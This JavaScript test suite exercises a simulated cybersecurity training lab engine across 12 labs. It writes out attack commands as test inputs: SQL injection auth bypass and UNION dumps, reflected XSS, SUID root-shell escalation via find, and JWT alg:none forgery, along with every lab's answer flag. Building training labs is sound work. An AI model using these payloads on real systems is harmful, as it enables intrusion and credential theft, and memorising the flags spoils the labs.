/**
 * ============================================================================
 * ENDLESSUS PRACTICAL LABS — COMPREHENSIVE AUTOMATED TERMINAL TEST SUITE
 * ============================================================================
 * Tests all 12 practical cybersecurity labs:
 *   1. HTTP Security Headers Hardening (lab-headers)
 *   2. Linux Permissions & Octal Masking (lab-permissions)
 *   3. Authentication & Rate Limiting Bypass (lab-auth)
 *   4. IDOR (lab-idor)
 *   5. UNION-Based SQL Injection (lab-sqli)
 *   6. Reflected XSS & Context Escaping (lab-xss)
 *   7. CSRF & SameSite (lab-csrf)
 *   8. Network Service & SMB Enumeration (lab-network)
 *   9. Security Incident Log Analysis (lab-logs)
 *  10. SUID Privilege Escalation (lab-suid)
 *  11. JWT 'None' Algorithm Exploitation (lab-jwt)
 *  12. XOR & Frequency Analysis Decryption (lab-crypto)
 * ============================================================================
 */

const assert = require('assert');
const LabEngine = require('./lab-engine.js');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function test(name, fn) {
  totalTests++;
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passedTests++;
  } catch (err) {
    console.error(`  ✗ FAIL: ${name}`);
    console.error(`    ${err.message}`);
    failedTests++;
  }
}

async function asyncTest(name, fn) {
  totalTests++;
  try {
    await fn();
    console.log(`  ✓ ${name}`);
    passedTests++;
  } catch (err) {
    console.error(`  ✗ FAIL: ${name}`);
    console.error(`    ${err.message}`);
    failedTests++;
  }
}

async function runAllTests() {
  console.log('\n============================================================');
  console.log('STARTING ENDLESSUS 12 PRACTICAL LABS TERMINAL AUDIT TEST SUITE');
  console.log('============================================================\n');

  // -------------------------------------------------------------------------
  // 1. LAB 01: HTTP Security Headers Hardening
  // -------------------------------------------------------------------------
  console.log('--- LAB 01: lab-headers ---');
  LabEngine.resetLab('lab-headers');

  await asyncTest('Task 1: curl -I queries headers without auto-completing tasks 2, 3, 4', async () => {
    const res = await LabEngine.execute('lab-headers', 'curl -I https://staging.acmefin.local');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('HTTP/1.1 200 OK'));
    assert.ok(res.stdout.includes('Server: Apache/2.4.41'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0], 'Only Task 1 (index 0) must be completed!');
  });

  await asyncTest('Incomplete/missing URL rejects curl with syntax error', async () => {
    const res = await LabEngine.execute('lab-headers', 'curl');
    assert.strictEqual(res.exitCode, 2);
    assert.ok(res.stderr.includes('no URL specified'));
  });

  await asyncTest('Pipeline execution: curl -I | grep -i server filters header output', async () => {
    const res = await LabEngine.execute('lab-headers', 'curl -I https://staging.acmefin.local | grep -i server');
    assert.strictEqual(res.exitCode, 0);
    assert.strictEqual(res.stdout.trim(), 'Server: Apache/2.4.41 (Ubuntu)');
  });

  await asyncTest('Task 2: curl -I | grep -i strict checks for HSTS absence and completes Task 2', async () => {
    const res = await LabEngine.execute('lab-headers', 'curl -I https://staging.acmefin.local | grep -i strict');
    assert.strictEqual(res.exitCode, 1, 'HSTS is absent so grep exits with 1');
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: curl -I | grep -i frame checks framing controls and completes Task 3', async () => {
    const res = await LabEngine.execute('lab-headers', 'curl -I https://staging.acmefin.local | grep -i frame');
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: curl -I | grep -i set-cookie checks cookie flags and completes Task 4', async () => {
    const res = await LabEngine.execute('lab-headers', 'curl -I https://staging.acmefin.local | grep -i set-cookie');
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  await asyncTest('Task 5: cat /etc/nginx/conf.d/security.conf reads hardened config and completes Task 5', async () => {
    const res = await LabEngine.execute('lab-headers', 'cat /etc/nginx/conf.d/security.conf');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{strict_transport_security_csp}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
  });

  // -------------------------------------------------------------------------
  // 2. LAB 02: Linux Permissions & Octal Masking
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 02: lab-permissions ---');
  LabEngine.resetLab('lab-permissions');

  await asyncTest('Task 1: ls -la lists long directory format', async () => {
    const res = await LabEngine.execute('lab-permissions', 'ls -la');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('-rwxrwxrwx'));
    assert.ok(res.stdout.includes('config.php'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('chmod with missing operands returns standard error', async () => {
    const res = await LabEngine.execute('lab-permissions', 'chmod');
    assert.strictEqual(res.exitCode, 1);
    assert.ok(res.stderr.includes('missing operand'));
  });

  await asyncTest('chmod on non-existent file returns cannot access error', async () => {
    const res = await LabEngine.execute('lab-permissions', 'chmod 600 fakefile.txt');
    assert.strictEqual(res.exitCode, 1);
    assert.ok(res.stderr.includes('cannot access'));
  });

  await asyncTest('Task 2: ls -la config.php inspects world-writable file', async () => {
    const res = await LabEngine.execute('lab-permissions', 'ls -la config.php');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('-rwxrwxrwx'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: cat config.php reads credentials', async () => {
    const res = await LabEngine.execute('lab-permissions', 'cat config.php');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('db_admin'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: chmod 600 config.php modifies VFS state and completes Task 4', async () => {
    const res = await LabEngine.execute('lab-permissions', 'chmod 600 config.php');
    assert.strictEqual(res.exitCode, 0);
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);

    // Verify VFS state
    const lsRes = await LabEngine.execute('lab-permissions', 'ls -la config.php');
    assert.ok(lsRes.stdout.includes('-rw-------'), 'VFS mode must be -rw------- after chmod 600');
  });

  await asyncTest('Task 5: stat -c "%a %n" config.php verifies 600 and completes Task 5', async () => {
    const res = await LabEngine.execute('lab-permissions', 'stat -c "%a %n" config.php');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('600 config.php'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
  });

  // -------------------------------------------------------------------------
  // 3. LAB 03: Authentication & Rate Limiting Bypass
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 03: lab-auth ---');
  LabEngine.resetLab('lab-auth');

  await asyncTest('Task 1: cat /app/server.js reads authentication source', async () => {
    const res = await LabEngine.execute('lab-auth', 'cat /app/server.js');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('express.json'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: cat /app/server.js | grep -i select isolates flawed query', async () => {
    const res = await LabEngine.execute('lab-auth', 'cat /app/server.js | grep -i select');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes("SELECT * FROM users"));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Invalid login credentials without SQLi returns 401', async () => {
    const res = await LabEngine.execute('lab-auth', 'curl -X POST -d "username=admin&password=wrong" http://10.10.10.45/login');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('401 Unauthorized'));
    assert.deepStrictEqual(res.newlyCompleted, []);
  });

  await asyncTest("Task 3: curl with admin'-- SQLi payload bypasses authentication", async () => {
    const res = await LabEngine.execute('lab-auth', `curl -X POST -H "Content-Type: application/json" -d '{"username":"admin\\'--","password":"x"}' http://10.10.10.45/login`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('"status": "success"'));
    assert.ok(res.stdout.includes('flag{rate_limit_429_bcrypt}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: curl -I http://10.10.10.45/login audits headers and completes Task 4', async () => {
    const res = await LabEngine.execute('lab-auth', 'curl -I http://10.10.10.45/login');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('HTTP/1.1 200 OK'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  // -------------------------------------------------------------------------
  // 4. LAB 04: IDOR
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 04: lab-idor ---');
  LabEngine.resetLab('lab-idor');

  await asyncTest('Task 1: Fetch own invoice 9482', async () => {
    const res = await LabEngine.execute('lab-idor', 'curl http://billing.internal.local/api/v1/invoices/9482');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('"id": 9482'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: Tamper adjacent invoice 9481', async () => {
    const res = await LabEngine.execute('lab-idor', 'curl http://billing.internal.local/api/v1/invoices/9481');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('"id": 9481'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: Access executive invoice 10043', async () => {
    const res = await LabEngine.execute('lab-idor', 'curl http://billing.internal.local/api/v1/invoices/10043');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('10043'));
    assert.ok(res.stdout.includes('flag{server_side_authz_session_token}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: Extract authorization flag with grep', async () => {
    const res = await LabEngine.execute('lab-idor', 'curl http://billing.internal.local/api/v1/invoices/10043 | grep flag');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{server_side_authz_session_token}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  // -------------------------------------------------------------------------
  // 5. LAB 05: UNION-Based SQL Injection
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 05: lab-sqli ---');
  LabEngine.resetLab('lab-sqli');

  await asyncTest("Task 1: Single quote triggers syntax error", async () => {
    const res = await LabEngine.execute('lab-sqli', `curl "http://shop.local/search?item=shirt'"`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('500 Internal Server Error'));
    assert.ok(res.stdout.includes('unrecognized token'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: ORDER BY 4 succeeds, ORDER BY 5 errors', async () => {
    const res1 = await LabEngine.execute('lab-sqli', `curl "http://shop.local/search?item=' ORDER BY 4-- -"`);
    assert.strictEqual(res1.exitCode, 0);
    assert.ok(res1.stdout.includes('200 OK'));
    assert.deepStrictEqual(res1.newlyCompleted.map(t => t.index), [1]);

    const res2 = await LabEngine.execute('lab-sqli', `curl "http://shop.local/search?item=' ORDER BY 5-- -"`);
    assert.ok(res2.stdout.includes('ORDER BY term out of range'));
  });

  await asyncTest('Task 3: UNION SELECT with sqlite_version() reveals DB version', async () => {
    const res = await LabEngine.execute('lab-sqli', `curl "http://shop.local/search?item=' UNION SELECT 1,sqlite_version(),3,4-- -"`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('SQLite 3.37.2'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: UNION SELECT from users table dumps credentials', async () => {
    const res = await LabEngine.execute('lab-sqli', `curl "http://shop.local/search?item=' UNION SELECT 1,username,password_hash,4 FROM users-- -"`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('admin'));
    assert.ok(res.stdout.includes('flag{parameterized_queries_prepared_statement}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  // -------------------------------------------------------------------------
  // 6. LAB 06: Reflected XSS & Context Escaping
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 06: lab-xss ---');
  LabEngine.resetLab('lab-xss');

  await asyncTest('Task 1: Probe reflects angle brackets', async () => {
    const res = await LabEngine.execute('lab-xss', `curl "http://portal.local/search?q=test<probe>"`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('value="test<probe>"'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: Identify HTML input attribute context', async () => {
    const res = await LabEngine.execute('lab-xss', `curl "http://portal.local/search?q=mysearch" | grep -i input`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('<input'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: Break out of attribute using double quotes', async () => {
    const res = await LabEngine.execute('lab-xss', `curl "http://portal.local/search?q=test\\\"+autofocus"`);
    assert.strictEqual(res.exitCode, 0);
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: Inject onfocus event handler and retrieve flag', async () => {
    const res = await LabEngine.execute('lab-xss', `curl "http://portal.local/search?q=test\\\"+autofocus+onfocus=\\\"alert(document.domain)\\\"+x=\\\""`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{context_aware_output_encoding_csp}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  // -------------------------------------------------------------------------
  // 7. LAB 07: CSRF & SameSite
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 07: lab-csrf ---');
  LabEngine.resetLab('lab-csrf');

  await asyncTest('Task 1: Analyze state-changing transfer endpoint', async () => {
    const res = await LabEngine.execute('lab-csrf', 'curl -X POST -d "to_account=12345&amount=100" http://bank.local/transfer');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('success'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: Inspect cookie for missing SameSite', async () => {
    const res = await LabEngine.execute('lab-csrf', 'curl -I http://bank.local/login | grep -i cookie');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('Set-Cookie'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: Review PoC exploit form', async () => {
    const res = await LabEngine.execute('lab-csrf', 'cat /var/www/attacker/exploit.html');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('csrfForm'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: Read anti-CSRF token flag', async () => {
    const res = await LabEngine.execute('lab-csrf', 'cat /var/www/bank/csrf_token.txt');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{samesite_strict_anti_csrf_token}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  // -------------------------------------------------------------------------
  // 8. LAB 08: Network Service & SMB Enumeration
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 08: lab-network ---');
  LabEngine.resetLab('lab-network');

  await asyncTest('smbclient with no arguments returns usage error instead of fake pass', async () => {
    const res = await LabEngine.execute('lab-network', 'smbclient');
    assert.strictEqual(res.exitCode, 1);
    assert.ok(res.stderr.includes('Usage: smbclient'));
    assert.deepStrictEqual(res.newlyCompleted, []);
  });

  await asyncTest('Task 1: nmap -sS -sV 10.10.20.15 performs stealth scan', async () => {
    const res = await LabEngine.execute('lab-network', 'nmap -sS -sV 10.10.20.15');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('vsftpd 2.3.4'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: nmap -sV -p 21 10.10.20.15 isolates FTP port', async () => {
    const res = await LabEngine.execute('lab-network', 'nmap -sV -p 21 10.10.20.15');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('21/tcp open  ftp'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: nc -vn 10.10.20.15 21 grabs banner', async () => {
    const res = await LabEngine.execute('lab-network', 'nc -vn 10.10.20.15 21');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('220 (vsFTPd 2.3.4)'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: smbclient -L //10.10.20.15 -N enumerates anonymous shares', async () => {
    const res = await LabEngine.execute('lab-network', 'smbclient -L //10.10.20.15 -N');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('public'));
    assert.ok(res.stdout.includes('backups'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  await asyncTest('Task 5: smbclient downloads flag.txt and cat verifies flag', async () => {
    const smbRes = await LabEngine.execute('lab-network', 'smbclient //10.10.20.15/public -N -c "get flag.txt; exit"');
    assert.strictEqual(smbRes.exitCode, 0);
    assert.ok(smbRes.stdout.includes('getting file \\flag.txt'));
    assert.deepStrictEqual(smbRes.newlyCompleted.map(t => t.index), [4]);

    const catRes = await LabEngine.execute('lab-network', 'cat flag.txt');
    assert.strictEqual(catRes.exitCode, 0);
    assert.ok(catRes.stdout.includes('flag{closed_filtered_port_21_backdoor}'));
  });

  // -------------------------------------------------------------------------
  // 9. LAB 09: Security Incident Log Analysis
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 09: lab-logs ---');
  LabEngine.resetLab('lab-logs');

  await asyncTest('Task 1: cat access.log | head -n 2 reads access log lines', async () => {
    const res = await LabEngine.execute('lab-logs', 'cat access.log | head -n 2');
    assert.strictEqual(res.exitCode, 0);
    const lines = res.stdout.trim().split('\n');
    assert.strictEqual(lines.length, 2, 'head -n 2 must return exactly 2 lines');
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: grep -E "\\.\\./" access.log isolates path traversal', async () => {
    const res = await LabEngine.execute('lab-logs', 'grep -E "\\.\\./" access.log');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('/etc/passwd'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: grep uploads access.log isolates web shell', async () => {
    const res = await LabEngine.execute('lab-logs', 'grep uploads access.log');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('shell.php'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: grep "Failed password" auth.log isolates SSH brute force IP', async () => {
    const res = await LabEngine.execute('lab-logs', 'grep "Failed password" auth.log');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('192.168.1.50'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  await asyncTest('Task 5: cat incident_summary.txt submits flag', async () => {
    const res = await LabEngine.execute('lab-logs', 'cat incident_summary.txt');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{failed_ssh_brute_force_192_168_1_50}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
  });

  // -------------------------------------------------------------------------
  // 10. LAB 10: SUID Privilege Escalation
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 10: lab-suid ---');
  LabEngine.resetLab('lab-suid');

  await asyncTest('Task 1: id verifies guest privilege boundary', async () => {
    const res = await LabEngine.execute('lab-suid', 'id');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('uid=1001(guest)'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Reading /root/flag.txt before escalation returns Permission denied', async () => {
    const res = await LabEngine.execute('lab-suid', 'cat /root/flag.txt');
    assert.strictEqual(res.exitCode, 1);
    assert.ok(res.stderr.includes('Permission denied'));
    assert.deepStrictEqual(res.newlyCompleted, []);
  });

  await asyncTest('Task 2: find / -perm -4000 -type f 2>/dev/null enumerates SUID binaries', async () => {
    const res = await LabEngine.execute('lab-suid', 'find / -perm -4000 -type f 2>/dev/null');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('/usr/bin/find'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: ls -l /usr/bin/find inspects SUID bits', async () => {
    const res = await LabEngine.execute('lab-suid', 'ls -l /usr/bin/find');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('-rwsr-xr-x'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: find . -exec /bin/sh -p \\; -quit elevates to root shell', async () => {
    const res = await LabEngine.execute('lab-suid', 'find . -exec /bin/sh -p \\; -quit');
    assert.strictEqual(res.exitCode, 0);
    assert.strictEqual(res.isRoot, true, 'Engine must register elevated root state');
    assert.ok(res.prompt.includes('root@sec-station:~#'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  await asyncTest('whoami as elevated root returns "root"', async () => {
    const res = await LabEngine.execute('lab-suid', 'whoami');
    assert.strictEqual(res.stdout.trim(), 'root');
  });

  await asyncTest('Task 5: cat /root/flag.txt reads root flag now that EUID=0', async () => {
    const res = await LabEngine.execute('lab-suid', 'cat /root/flag.txt');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{suid_find_root_euid0}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
  });

  // -------------------------------------------------------------------------
  // 11. LAB 11: JWT 'None' Algorithm Exploitation
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 11: lab-jwt ---');
  LabEngine.resetLab('lab-jwt');

  await asyncTest('Task 1: cat token.txt reads guest token', async () => {
    const res = await LabEngine.execute('lab-jwt', 'cat token.txt');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('eyJhbGciOiJIUzI1Ni'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: echo ... | base64 -d decodes token payload', async () => {
    const res = await LabEngine.execute('lab-jwt', `echo "eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzAwMDAwMDAwfQ" | base64 -d`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('"sub":"guest"'));
    assert.ok(res.stdout.includes('"role":"user"'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest("Task 3: echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 encodes alg:none header", async () => {
    const res = await LabEngine.execute('lab-jwt', `echo -n '{"alg":"none","typ":"JWT"}' | base64`);
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('eyJhbGciOiJub25l'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: python3 forge_jwt.py generates forged token', async () => {
    const res = await LabEngine.execute('lab-jwt', 'python3 forge_jwt.py');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('eyJhbGciOiJub25l'));
    assert.ok(res.stdout.includes('flag{none_algorithm_signature_verification}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  await asyncTest('Task 5: curl transmits forged token to /admin', async () => {
    const res = await LabEngine.execute('lab-jwt', 'curl -H "Authorization: Bearer eyJhbGciOiJub25l...admin..." http://auth.api.local/admin');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('superadmin'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
  });

  // -------------------------------------------------------------------------
  // 12. LAB 12: XOR & Frequency Analysis Decryption
  // -------------------------------------------------------------------------
  console.log('\n--- LAB 12: lab-crypto ---');
  LabEngine.resetLab('lab-crypto');

  await asyncTest('Task 1: cat ciphertext.hex reads hex data', async () => {
    const res = await LabEngine.execute('lab-crypto', 'cat ciphertext.hex');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('1b37373331'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
  });

  await asyncTest('Task 2: python3 -c "print(2**8)" calculates 256 keyspace', async () => {
    const res = await LabEngine.execute('lab-crypto', 'python3 -c "print(2**8)"');
    assert.strictEqual(res.exitCode, 0);
    assert.strictEqual(res.stdout.trim(), '256');
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
  });

  await asyncTest('Task 3: python3 -c "print(\'ETAOIN SHRDLU\')" outputs English frequencies', async () => {
    const res = await LabEngine.execute('lab-crypto', "python3 -c \"print('ETAOIN SHRDLU')\"");
    assert.strictEqual(res.exitCode, 0);
    assert.strictEqual(res.stdout.trim(), 'ETAOIN SHRDLU');
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
  });

  await asyncTest('Task 4: python3 solve.py runs frequency solver and recovers plaintext', async () => {
    const res = await LabEngine.execute('lab-crypto', 'python3 solve.py');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes("0x58 ('X')"));
    assert.ok(res.stdout.includes("Cooking MC's like a pound of bacon"));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
  });

  await asyncTest('Task 5: cat decrypted.txt verifies flag', async () => {
    const res = await LabEngine.execute('lab-crypto', 'cat decrypted.txt | grep flag');
    assert.strictEqual(res.exitCode, 0);
    assert.ok(res.stdout.includes('flag{aes_gcm_authenticated_encryption}'));
    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
  });

  // -------------------------------------------------------------------------
  // 13. GLOBAL FLAG VERIFICATION TESTS (ALL 12 LABS)
  // -------------------------------------------------------------------------
  console.log('\n--- VERIFYING FLAGS FOR ALL 12 LABS ---');
  const flagsToTest = [
    { labId: 'lab-headers', flag: 'flag{strict_transport_security_csp}' },
    { labId: 'lab-permissions', flag: 'flag{chmod_600_config_rw}' },
    { labId: 'lab-auth', flag: 'flag{rate_limit_429_bcrypt}' },
    { labId: 'lab-idor', flag: 'flag{server_side_authz_session_token}' },
    { labId: 'lab-sqli', flag: 'flag{parameterized_queries_prepared_statement}' },
    { labId: 'lab-xss', flag: 'flag{context_aware_output_encoding_csp}' },
    { labId: 'lab-csrf', flag: 'flag{samesite_strict_anti_csrf_token}' },
    { labId: 'lab-network', flag: 'flag{closed_filtered_port_21_backdoor}' },
    { labId: 'lab-logs', flag: 'flag{failed_ssh_brute_force_192_168_1_50}' },
    { labId: 'lab-suid', flag: 'flag{suid_find_root_euid0}' },
    { labId: 'lab-jwt', flag: 'flag{none_algorithm_signature_verification}' },
    { labId: 'lab-crypto', flag: 'flag{aes_gcm_authenticated_encryption}' }
  ];

  flagsToTest.forEach(({ labId, flag }) => {
    test(`Flag verification for ${labId}`, () => {
      const result = LabEngine.verifyFlag(labId, flag);
      assert.strictEqual(result.success, true, `Flag ${flag} must verify successfully for ${labId}`);
    });
  });

  test('Reject invalid flag across engine', () => {
    const result = LabEngine.verifyFlag('lab-headers', 'flag{totally_fake_random_flag}');
    assert.strictEqual(result.success, false, 'Invalid flag must be rejected');
  });

  // -------------------------------------------------------------------------
  // FINAL SUMMARY
  // -------------------------------------------------------------------------
  console.log('\n============================================================');
  console.log(`TEST RESULTS: ${passedTests}/${totalTests} Passed (${failedTests} Failed)`);
  console.log('============================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runAllTests().catch(err => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
